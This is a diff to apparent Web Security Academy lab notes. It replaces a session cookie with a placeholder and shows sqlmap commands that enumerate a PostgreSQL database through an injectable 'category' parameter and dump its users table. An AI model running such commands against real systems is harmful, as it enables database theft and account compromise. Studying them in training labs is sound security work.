@@ -759,21 +759,25 @@ sqlmap -v -r sqli-blind.txt --batch --random-agent --level=5 --risk=3 -p "Tracki
 >SQLMAP determine the vulnerability, and perform initial enumeration.  
 
 ```bash
-sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3
+sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=3 --risk=3
 ```  
 
 >SQLMAP determine the database DBMS.  
 
 ```bash
-sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -dbs
+sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -dbs
 ```  
 
 >SQLMAP determine Database, Tables, dump, data Exfiltration.  
 
 ```bash
-sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -D public --tables
+sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -D public --tables
+```  
 
-sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=5 --risk=3
+>Dump content from table **users** in the **public** database.  
+
+```
+sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=5 --risk=3
 
 ```  
 
